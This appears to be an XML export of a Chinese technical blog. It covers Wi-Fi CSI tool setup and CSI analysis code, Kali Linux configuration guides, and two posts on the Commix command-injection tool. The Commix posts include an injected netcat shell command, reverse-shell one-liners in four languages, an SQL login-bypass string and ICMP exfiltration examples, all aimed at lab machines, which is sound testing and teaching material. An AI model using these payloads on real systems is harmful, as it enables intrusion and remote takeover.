这一步也有点小问题，这里面的文件名可能是有些小问题，如果出错的话，把固件改名，复制到该文件夹里。我的电脑里面iwlwifi系列如下所示 12345iwlwifi-1000-3.ucode iwlwifi-5000-2.ucode.origiwlwifi-3945-2.ucode iwlwifi-5000-2.ucode.sigcomm2010iwlwifi-4965-2.ucode iwlwifi-5150-2.ucodeiwlwifi-5000-1.ucode.orig iwlwifi-6000-4.ucodeiwlwifi-5000-2.ucode Download and compile hostapAt the time of writing, hostap 0.7 is the stable version. 123456cd # Back out of the kernel treegit clone git://w1.fi/srv/git/hostap-07.git # Get the codecd hostap-07/hostapdcp &lt;hostap-dotconfig&gt; .config # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/makecp &lt;hostapd.conf-test&gt; hostapd.conf # Install the vanilla hostap conf we provide 这一步没有问题，安装hostapd，把电脑当作access point，功能相当于无线路由器，也可以直接用路由器，省略这一步 Install the userspace logging utilityThe userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/. 123cd ~/linux-80211n-csitool-supplementary/netlink # We assume you install into your home directorymake # hopefully the make succeeds!# If not, figure out why it didn't compile. Did you install the Linux headers above? 编译hostap，实际上这个不编译也没关系，因为有路由器或者安桌手机就可以充当ap Let’s try it out!1234sudo modprobe iwlwifi # did it work? Do you see logs about iwlwifi in the dmesg?sudo iwlist scanning # 扫描ap，窗口中会出现可以扫描到的无线网络。sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf# 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错 测试hostap时： 1sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错：所以执行该命令前必须将无线网络连接断开，此时作为路由功能开启(出现结果)： 123using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid 'csitool-test'wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticatedwlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1) 手机可以连上‘csitool-test’的网络，状态一直是正在获取ipMake sure to kill hostapd when you’re done. Then put 802.11n-enabled hostapd config file in place: 1cp &lt;hostapd.conf-real&gt; hostapd.conf # Install the real hostap conf we provide 采集csi数据部分（关闭本机电脑作为路由的功能，保证连无线网的功能即可，用另一台电脑开启hostapd作为ap）： 1234sudo rmmod iwlwifi mac80211 cfg80211 # remove the modulessudo modprobe iwlwifi connector_log=0x1 #load the modules and set userspace beamforming logging#first,associate and set up IP to an AP that will send you HT packets#需要用另外一台电脑作为ap并设置好IP地址，当前电脑连上那个ap 12cd ~/linux-80211n-csitool-supplementary/netlinksudo ./log_to_file tmp.dat #当前电脑相当于dp（探测点），log_to_file tmp.dat可以记录csi的值 再打开另一个终端（命令行窗口）ping ，ping所连ap的ip地址，ping多次过后便会有csi数据 1234sudo rmmod iwlwifi mac80211 cfg80211 sudo modprobe iwlwifi connector_log=0x1cd ~/wifil/netlinksudo ./log_to_file &lt;地址/文件名&gt; 最后，使用该软件的时候，现一行一行地把上面代码部分粘贴到terminal里面，再连接没密码的wifi，然后再打开另一个terminal，ping 该ap的ap地址就可以运行另外，安卓手机ping的ap地址是192.168.43.1用路由器的话设置成接入点模式。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Commix命令详解]]></title>
    <url>%2F2017%2F01%2F21%2FCommix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[介绍项目地址：https://github.com/stasinopoulos/commix Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。 使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081选项： -v VERBOSE详细程度级别（0-1，默认值：0）。 --version 显示版本号并退出。 --output-dir=.. 设置自定义输出目录路径。 -s SESSION_FILE 从存储（.sqlite）文件加载会话。 --flush-session 刷新当前目标的会话文件。 --ignore-session 忽略存储在会话文件中的结果。 目标： -u URL，--url = URL 目标URL。 --url-reload 在命令执行后重新加载目标URL。 -l LOGFILE 解析来自HTTP代理日志文件的目标和数据。 --crawl = CRAWLDEPTH 从目标网址开始抓取网站（1-2，默认值：0）。 请求： --data=DATA 要通过POST发送的数据字符串。 --host=HOST HTTP主机头。 --referer=REFERER HTTP Referer标头。 --user-agent=AGENT HTTP用户代理头。 --random-agent 使用随机选择的HTTP User-Agent头。 --param-del=PDEL 设置分割参数值的字符。 --cookie=COOKIE HTTP Cookie头。 --cookie-del=CDEL 设置分割cookie值的字符。 --headers=HEADERS 额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。 --proxy=PROXY 使用HTTP代理（例如“127.0.0.1:8080”）。 --tor 使用Tor网络。 --tor-port=... 设置Tor代理端口（默认值：8118）。 --auth-url=... 登录面板URL。 --auth-data =AUTH 登录参数和数据。 --auth-type =AUTH HTTP认证类型（例如“基本”或“摘要”）。 --auth-cred =AUTH HTTP身份验证凭据（例如“admin：admin”）。 --ignore-401 忽略HTTP错误401（未授权）。 --force-ssl 强制使用SSL / HTTPS。 枚举： 这些选项可用于枚举目标主机。 --all 检索一切。 --current-user 检索当前用户名。 --hostname 检索当前主机名。 --is-root 检查当前用户是否具有root权限。 --is-admin 检查当前用户是否具有管理员权限。 --sys-info 检索系统信息。 --users 检索系统用户。 --passwords 检索系统用户密码散列。 --privileges 检索系统用户权限。 --ps-version 检索PowerShell的版本号。 文件访问： 这些选项可用于访问目标主机上的文件。 --file-read = FILE .. 从目标主机读取文件。 --file-write = FIL .. 写入目标主机上的文件。 --file-upload = FI .. 在目标主机上上传文件。 --file-dest = FILE .. 写入和/或上传到的主机的绝对文件路径。 模块： 这些选项可用于增加检测和/或注射能力。 --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。 （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。 --dns-server = DNS ..“DNS exfiltration”注入模块。 （用于DNS筛选攻击的域名）。 --shellshock“炮弹”注射模块。 注射： 这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。 -p TEST_PARAMETER 可测试参数。 --suffix = SUFFIX 注入有效负载后缀字符串。 --prefix = PREFIX 注入有效负载前缀字符串。 --technique = TECH 指定要使用的进样技术。 --maxlen = MAXLEN 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。 --delay = DELAY 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。 --tmp-path = TMP_P .. 设置Web服务器的临时目录的绝对路径。 --root-dir = SRV_R .. 设置Web服务器根目录的绝对路径。 --alter-shell = AL .. 使用另一个os-shell（例如&apos;Python&apos;）。 --os-cmd = OS_CMD 执行单个操作系统命令。 --os = OS 将后端操作系统强制为此值。 --tamper = TAMPER 使用给定脚本篡改注射数据。 检测： 这些选项可用于自定义检测阶段。 --level = LEVEL 要执行的测试级别（1-3，默认值：1）。 --skip-calc 在检测期间跳过数学计算 --dependencies 检查第三方（非内核）依赖关系。 --skip-waf 绕过启发式检测WAF / IPS / IDS保护。 例子1234567891011121314151617181920212223242526272829python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）测试漏洞web应用Damnpython commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;使用注入攻击Payload参数测试php-Charts 1.0python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;使用特殊的头和HTTP代理测试OWASP Mutillidaepython commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;使用ICMP渗漏（exfiltration）技术测试Persistencesu -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot; 配合一些反弹shell1. Python-reverse-shell: python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’2. PHP-reverse-shell: php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’3. Perl-reverse-shell: perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’4. Ruby-reverse-shell: ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’]]></content>
  </entry>
  <entry>
    <title><![CDATA[commix使用示例]]></title>
    <url>%2F2017%2F01%2F21%2Fcommix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot; 2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot; 3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot; 4. Exploiting Persistence using ICMP exfiltration technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot; 5. Exploiting Persistence using an alternative (python) shell:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot; 6. Exploiting Kioptrix: Level 1.1 (#2):1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot; 7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot; 8. Exploiting CVE-2014-6271/Shellshock:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock 9. Exploiting commix-testbed (cookie) using cookie-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot; 10. Exploiting commix-testbed (user-agent) using ua-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3 11. Exploiting commix-testbed (referer) using referer-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3 12. Exploiting Flick 2 using custom headers and base64 encoding option:1root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64 13. Exploiting commix-testbed (JSON-based) using JSON POST data:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos; 14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`]]></content>
  </entry>
  <entry>
    <title><![CDATA[基于CSI的移动目标侦测研究学习]]></title>
    <url>%2F2017%2F01%2F21%2F%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。 需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。 获取数据cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行 1sudo ./log_to_file tmp.dat 打开另一个终端，运行 1ping 192.168.1.1 -i 0.2 netlink文件夹中的tmp.dat就是采集的原始数据。 读取数据使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。 一个例子数据包里包含 123456789101112timestamp_low: 4 (In the sample trace, timestamp_low is invalid and always 4.)bfee_count: 72Nrx: 3Ntx: 1rssi_a: 33rssi_b: 37rssi_c: 41noise: -127agc: 38perm: [3 2 1]rate: 256csi: [1x3x30 double] timestamp_low 是时间戳 bfee_count 数据包数量 Nrx,Ntx 分别表示接收端和发送端的天线数量 rssi_a, rssi_b, rssi_c 每个天线的RSSI数据，单位dB， agc Automatic Gain Control perm NIC重排列后的顺序结果，代表RF链路的顺序 rate 发送包的rate csi CSI原始数据，是个Ntx×Nrx×30复数矩阵 主要提取出CSI数据和timestamp_low。 数据预处理为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from math import *import numpy as npimport copyN = 1000 # N为采集的数据包数量def complexDecoding(raw_data):“””将原始数据转化为Python可识别的复数这里使用了第一个天线的数据raw_data[0]第二根第三根天线数据下标分别为1, 2原始数据为a + bi, python为a + bj返回处理后的数据“””for n in range(N):for i in range(30): # 30 代表子载波数量，固定为30if raw_data[0][-1] == ‘i’:data.append(complex(raw_data[0][:-1]+‘j’))else:data.append(complex(raw_data[0]))return datadef getAP(data):“””根据复数计算振幅和相位“””amplitudes = [([] * 30) for i in range(N)]phases = [([] * 30) for i in range(N)]for m in range(N):for i in range(30):r = sqrt((data[i + m * 30].real) ** 2 + (data[i + m * 30].imag) ** 2)amplitudes[m].append(r)phases[m].append(np.angle(data[i + m * 30]))return (amplitudes, phases)def preprocessingPhase(phases):“””将相位进行线性变换index是 -28 到 28 根据 IEEE 802.11n 协议返回变换后的相位“””index = range(-28,0,2) + [-1, 1] + range(3,28, 2) + [28]for m in range(N):for l in range(10):clear = Truebase = 0tphases[m][0] = phases[m][0]for i in range(1, 30):if phases[m][i] – phases[m][i-1] &gt; pi:base += 1clear = Falseelif phases[m][i] – phases[m][i-1] &lt; -pi:base –= 1clear = Falsetphases[m][i] = phases[m][i] – 2 * pi * baseif clear == True:breakelse:for i in range(30):phases[m][i] = tphases[m][i] – (tphases[m][29] – tphases[m][0])* 1.0 /(28 – (-28)) * (index[i])– 1.0 / 30 * sum([tphases[m][j] for j in range(30)])return phases 参考论文 PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information]]></content>
  </entry>
  <entry>
    <title><![CDATA[kali linux 2016 使用指南(二)]]></title>
    <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[虚拟机安装增强1.Kali 官方安装更新 /etc/apt/sources.list 你所添加的源，请确保是我在一中写的所有 然后在线安装增强功能 12345apt-get updateapt-get install -y virtualbox-guest-x11reboot 2.VirtualBox自带包安装123456789apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)cp /media/cd-rom/VBoxLinuxAdditions.run /root/chmod 755 /root/VBoxLinuxAdditions.runcd/root./VBoxLinuxAdditions.run 内核头有问题自己手动安装过程打开 http://http.kali.org/kali/pool/main/l/linux/ 下载对应自己内核版本的 linux-kbuild 12345678910111213wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.debdpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debapt-get -f install 开启SSH服务首先：编辑sshd_config文件 1vim /etc/ssh/sshd_config 其次：将sshd_config文件中的语句PermitRootLogin prohibit-password修改为： 1PermitRootLogin yes 再次：使用命令启动SSH服务: 123/etc/init.d/ssh start# 或者service ssh start 最后：设置系统开机自动启动SSH服务: 1update-rc.d ssh enable //系统自动启动SSH服务 mysql重置密码1、如果Linux中未安装MySQL，则需要下载安装，在安装的过程中会要求输入用户名密码，则无需重置，直接设置 2、MySQL设置UTF-8编码格式** 配置文件： 1root@kali:~# vim /etc/mysql/my.cnf 添加默认utf-8编码： 123456[client]default-character-set = utf8[mysqld]default-storage-engine = INNODBcharacter-set-server = utf8collation-server = utf8_general_ci 3、更新MySQL的用户名密码 首先查看MySQL是否运行，确保MySQL是stop状态，可以使用/etc/init.d/mysql stop停止运行 12root@kali:~# /etc/init.d/mysql status[info] MySQL is stopped.. 然后启动MySQL的server/daemon process 1root@kali:~# mysqld_safe –skip-grant-tables &amp; 使用root用户连接MySQL 12345678910root@kali:~# mysql -u rootWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 1Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; 更改root用户的密码为admin 1234567mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set password=PASSWORD(‘admin’) where User=‘root’;Query OK, 4 rows affected (0.01 sec)Rows matched: 4 Changed: 4 Warnings: 0 执行更新命令 12mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) flush privileges 命令本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。 退出 1mysql&gt; quit 4、验证用户密码是否更新成功 重启MySQL 1234567root@kali:~# /etc/init.d/mysql restart[ ok ] Stopping MySQL database server: mysqld.[….] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended[ .k[info] Checking for tables which need an upgrade, are corrupt or werenot closed cleanly..[1]+ 完成 mysqld_safe –skip-grant-tables 使用root用户连接MySQL 1234567891011root@kali:~# mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 43Server version: 5.5.44–0+deb7u1 (Debian)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.mysql&gt; metasploit Database not connect问题解决1、postgresql是本身没有启动的。所以需要启动。 1service postgresql start 2、通过命令进入配置 12sudo -u postgres psqlALTER USER postgres WITH PASSWORD ‘123.com’; 注意1：‘123.com’这个是密码。注意2：分号！！！！一定要带上分号“；”。注意3：\q：退出数据库 3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同） 123456root@kali:~# sudo passwd -d postgrespasswd：密码过期信息已更改。root@kali:~# sudo -u postgres passwd输入新的 UNIX 密码：重新输入新的 UNIX 密码：passwd：已成功更新密码 4、修改PostgresSQL数据库配置实现远程访问 12345678root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf更改#listen_addresses = ‘localhost’为 listen_addresses = ‘*’更改#password_encryption = on为password_encryption = onroot@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf在文档末尾加上以下内容# to allow your client visiting postgresql serverhost all all 0.0.0.0 0.0.0.0 md5root@kali:~# service postgresql restart 注意1：“#”号，一定要把“#”删除掉。注意2：在vi编辑模式下点击键盘字母a是进入编辑模式，编辑完成后点击“esc”退出编辑模式然后在最下方输入“：wq”保存并退出。 5、管理PostgreSQL用户和数据库 1root@kali:~# psql -U postgres -h 127.0.0.1 用户 postgres 的口令：psql (9.4.6)SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)输入 “help” 来获取帮助信息 1234567postgres=# create user “msf123” with password ‘123456’ nocreatedb;CREATE ROLEpostgres=# create database “msf1” with owner=”msf123”;ERROR: role “”msf123”” does not existpostgres=# create database “msf1″ with owner=”msf123”;CREATE DATABASEpostgres=# \q 注意1：还是要注意分号！！！没有分号命令就无法执行。注意2：注意复制的时候“”符号问题。注意3：user后面是用户名，password后面是用户名对应的密码。注意4：命令执行后有返回结果才是执行成功了。 6、msf配置连接 12345678root@kali:~# msfconsolemsf &gt; db_status[*] postgresql selected, no connectionmsf &gt; db_connect msf123:123456@127.0.0.1/msf1[*] Rebuilding the module cache in the background…msf &gt; db_status[*] postgresql connected to msf1msf &gt; 在msf启动后连接数据库就好。注意1：“msf123:123456”这个是步骤5中的“create user “msf123” with password ‘123456’ nocreatedb;”所建立的。“127.0.0.1”是指本机。“msf1”这个是库名。注意2：“[*] postgresql connected to msf1”这个是说明以链接成功数据库。 kali linux apt-get 证书校验错误错误信息 123456789root@teamserver:~# apt-get updateGet:1 http://mirror.neostrada.nl/kali kali-rolling InRelease [30.5 kB]Err:1 http://mirror.neostrada.nl/kali kali-rolling InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Fetched 30.5 kB in 1s (25.5 kB/s)Reading package lists... DoneW: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirror.neostrada.nl/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Some index files failed to download. They have been ignored, or old ones used instead. Kali 证书链过期 重新下载新的证书链 1wget -q -O - archive.kali.org/archive-key.asc | apt-key add ####安装32位运行库 123dpkg --add-architecture i386apt-get updateapt-get install lib32z1 lib32ncurses5]]></content>
  </entry>
  <entry>
    <title><![CDATA[kali linux 2016 使用指南(一)]]></title>
    <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[前言Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali Linux 2016.1版本发布，已经有7个月。在这期间，在Kali Linux 2016.2版本发布的这段时间，Kali Linux官方增补了94个更新。 主要的更新大概是这个样子： Kali Linux 2016系统中的音量调整按钮归并到右上角的关闭按钮，点击关闭按钮，就可以看到音量调整滑块按钮。 使用Kali Linux 2016系统在VMWare虚拟机时，在安装增强工具open-vm-tools后，复制较大文件，会出现复制进度对话框。该对话框消失后，文件并没有出现在目标位置。这时，再次粘贴一次，就可以了。如果还是没有要复制的文件，用户可以在根目录下的/tmp/VMwareDnD中找到临时文件夹。复制的文件保存在该文件夹中。 Kali Linux 2016.2默认浏览器不再是Iceweasel，替换为FireFox ESR。该版本不会像FireFox普通版本频繁更新 ​ 关于kali使用前的一些配置，网上有很多版本，但是不是老就是很不实用。而且现在kali已经更新到了2016.2版，大多新手肯定都想安装最新版进行尝试，那么接下来我就简记一下我安装和使用过程中，对一些问题的解决。 安装具体的安装步骤就不说了，大家都懂得 可以参考：《虚拟机安装kali2.0》 不想装的，官方也提供了ova文件，可以一键导入虚拟机。 在过去的几个月里，kali官方增加了新的相关工具，修复了固定的各种bug和操作系统的改进。一些Busybox添加了HTTPS支持，现在可以设置安全的支持SSL的kali，更方便快捷的安装kali。 系统更新kali linux的更新源很重要，一定要选好，rolling的选rolling的源。 首先： 1leafpad /etc/apt/sources.list 然后复制粘贴下面的源: 1234567891011121314151617181920212223#kali官方源deb http://http.kali.org/kali kali-rolling main non-free contrib#中科大的源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free#阿里云源deb http://mirrors.aliyun.com/kali sana main non-free contribdeb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-freedeb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free 然后更新并安装: 1apt-get update &amp;&amp; apt-get dist-upgrade 安装内核头（这个很多人都在问怎么办）我给出我的解决办法，总之还是升级内核 12$ uname -r$ 4.3.0-kali1-amd64 如果你使用我给出的源进行更新的话就会升级到4.6.0-kali1-amd64 这时候使用命令: 1apt-get install linux-headers-$(uname -r) 就可以了。 安装浏览器1.汉化火狐浏览器1apt-get install iceweasel-l10n-zh-cn 2.安装并使用chrome先下载chrome的deb安装包 执行dpkg -i google-chrome-xxx.deb你会发现报错，不用慌接下来执行 1apt–get install libappindicator1 可能还会报错，别慌，执行: 1apt-get -f install 然后安装完成，但是你会发现不能运行，原因是权限问题 我们添加一个用户: 1adduser zeroyu 然后一路回车，最后敲Y 之后按次序执行 12$ xhost +$ su zeroyu 之后敲入 google-chrome就好了 安装中文输入法个人喜欢搜狗输入法，所以再次给出搜狗输入法的安装方法 123apt-get install fcitxdpkg -i sougoupinyinXXX.debapt-get -f install 最后重启电脑就好了。（搜狗输入法安装包下载） 安装百度云宝宝的好多小秘密还藏在上面必须安装一下 依次执行： 123git clone https://github.com/LiuLang/bcloud-packagesapt-get -f installdpkg -i bcloud-x.x.x.deb 安装为知笔记到wiznote安装包下载地址找到相应的deb安装包 然后： 1dpkg –i wiznote_2.3xxxx.deb 安装shadowsocks1pip installshadowsocks–gtk 终端输入shadowsocks-gtk敲回车就可以看到ui界面了。 解决字体重叠问题这里先解决下碰到的坑 1apt–get install ttf–wqy–microhei ttf–wqy–zenhei xfonts–wqy 重启终端就好了，这个最好在安装内核头之前完成！ VPN安装1leafpad /etc/NetworkManager/NetworkManager.conf 修改最后一行的managed=false改为managed=true 然后执行下面的命令: 1234567apt–get install network–manager–openvpn–gnomeapt–get install network–manager–pptpapt–get install network–manager–pptp–gnomeapt–get install network–manager–strongswanapt–get install network–manager–vpncapt–get install network–manager–vpnc–gnome/etc/init.d/network–manager restart 1apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo “auto lo” &gt; /etc/network/interfaces echo “iface lo inet loopback” &gt;&gt; /etc/network/interfaces service network-manager start docker安装12apt–get updateapt–get install docker.io Redis安装redis下载 下载完后先编译 123tar xvf redis–x.x.x.tar.gzcd redis–x.x.xmake 而后安装: 123sudo make installcd utilssudo ./install_server.sh 接下来一步一步设置就好 Mac安装后启动问题的解决其实安装跟其它都一样，就是安装后启动要等好久（当然你也可以每次启动都按下option进行选择启动） 解决方法就是 插入macOS的安装光盘，重新启动，按住option 通过光盘启动 进入安装界面 从菜单选择terminal： 1bless –device /dev/disk0 –setBoot 